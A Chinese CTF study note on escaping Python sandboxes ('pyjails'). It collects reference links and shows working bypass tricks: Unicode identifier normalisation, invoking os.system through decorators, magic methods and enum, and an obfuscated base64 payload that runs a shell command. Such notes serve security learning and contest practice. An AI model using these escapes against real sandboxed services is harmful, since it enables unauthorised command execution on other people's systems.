# 文章
[Python 沙箱逃逸的经验总结](F:\LocalCTF\Python 沙箱逃逸的经验总结 - Tr0y's Blog.html)<br />[Python 沙箱逃逸的通解探索之路](https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/)<br />[Bypass Python sandboxes - HackTricks](https://book.hacktricks.xyz/v/fr/generic-methodologies-and-resources/python/bypass-python-sandboxes)<br />[[PyJail] python沙箱逃逸探究·下（HNCTF题解 - WEEK3）](https://zhuanlan.zhihu.com/p/579183067)<br />[[PyJail] python沙箱逃逸探究·中（HNCTF题解 - WEEK2）](https://zhuanlan.zhihu.com/p/579057932)<br />[[PyJail] python沙箱逃逸探究·上（HNCTF题解 - WEEK1）](https://zhuanlan.zhihu.com/p/578986988)<br />[由defcon延伸出的一类特殊RCE - 跳跳糖](http://tttang.com/archive/1428/#toc_0x03-2seccon-2021-hitchhike)<br />[Offensive Security Cheatsheet](https://cheatsheet.haax.fr/linux-systems/programing-languages/python/#pyjail-generate-a-shell)<br />[CTFtime.org / HeroCTF v5 / Pyjail / Writeup](https://ctftime.org/writeup/37010)<br />[CTFtime.org / Cyber Apocalypse 2021 / Build yourself in / Writeup](https://ctftime.org/writeup/27649)<br />[https://hackmd.io/@crazyman/H1s0b1Hii](https://hackmd.io/@crazyman/H1s0b1Hii)<br />[Python 沙箱逃逸的通解探索之路 - Tr0y's Blog.pdf](https://www.yuque.com/attachments/yuque/0/2023/pdf/25358086/1690373217235-1525d5b1-853a-46f7-b675-6b9178a2f52d.pdf)<br />[Python 沙箱逃逸的经验总结 - Tr0y's Blog.pdf](https://www.yuque.com/attachments/yuque/0/2023/pdf/25358086/1690373312344-57944b19-9ee1-4cc9-9615-cfb22beefca9.pdf)
### eval和exec的区别
[深度辨析 Python 的 eval() 与 exec()](https://zhuanlan.zhihu.com/p/60257325)<br />`eval()`只接受单个表达式，不支持复杂的代码逻辑<br />`exec()`第一个参数为代码块，可以执行复杂的代码逻辑
### unicode绕过
Python3.x 支持了 Unicode 变量名，而根据官方文档，解释器在做代码解析的时候，会对变量名进行规范化，使用的算法是 NFKC：<br />[https://docs.python.org/3/reference/lexical_analysis.html#identifiers](https://docs.python.org/3/reference/lexical_analysis.html#identifiers)
```python
eval == ᵉval
```
fuzz工具： [https://github.com/h13t0ry/UnicodeToy](https://github.com/h13t0ry/UnicodeToy)<br />网站：[https://www.compart.com/en/unicode/](https://www.compart.com/en/unicode/)<br />unicode数字替代：[https://www.fileformat.info/info/unicode/category/Nd/list.htm](https://www.fileformat.info/info/unicode/category/Nd/list.htm)
### 触发函数调用的另类方法
[OrangeKiller CTF 第 2 期题解](https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/)<br />[OrangeKiller CTF 第 2 期题解 - Tr0y's Blog.pdf](https://www.yuque.com/attachments/yuque/0/2023/pdf/25358086/1690375166348-f9986420-51f4-4a84-9fea-e6495d98b6e5.pdf)<br />装饰器触发函数调用
```python
from os import system


s2 = lambda x: "whoami"

@system
@s2
class x: pass
```
魔术方法触发函数调用
```python
from os import system


class x:
    def __getitem__(self, x):
        system(x)


# 上面这个写法可以改写为：
class x: pass
x.__getitem__ = system


x()["whoami"]
```
枚举调用函数
```python
import enum


enum.EnumMeta.__getitem__ = system
enum.Enum[request.args[{}.__doc__[2]+{}.__doc__[15]+{}.__doc__[0]]]
```
### 一些payload
```python
vars(eval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_𝟤_b𝟣_𝟣b_a_s_e_𝟨_𝟦=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict(X𝟣𝟫pbXBvcnRfXygnb𝟥MnKS𝟧wb𝟥BlbignZWNobyBIYWNrZWQ𝟨IGBpZGAnKS𝟧yZWFkKCkg=()))[len([])])
```

